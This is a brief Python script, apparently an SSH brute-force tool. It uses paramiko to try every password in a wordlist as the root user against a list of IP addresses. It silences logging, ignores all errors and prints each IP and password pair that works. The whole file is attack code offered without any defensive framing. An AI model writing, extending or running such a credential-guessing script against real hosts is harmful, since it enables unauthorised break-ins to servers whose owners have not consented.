import paramiko
import socket

paramiko.util.log_to_file('/dev/null')
class Instances(object):
    def __init__(self, ipList):
        self.ipList = ipList
        self.wordlist = open("wordlist.txt", "r").read().splitlines()
    def Run(self):
        for ip in self.ipList:
            print(ip)
            for password in self.wordlist:
                try:
                    client = paramiko.client.SSHClient()
                    client.connect(ip, username="root", password=password)
                    client.close()

                    print(f"{ip}:{password} YYYYY!!")
                except Exception as e:
                    pass


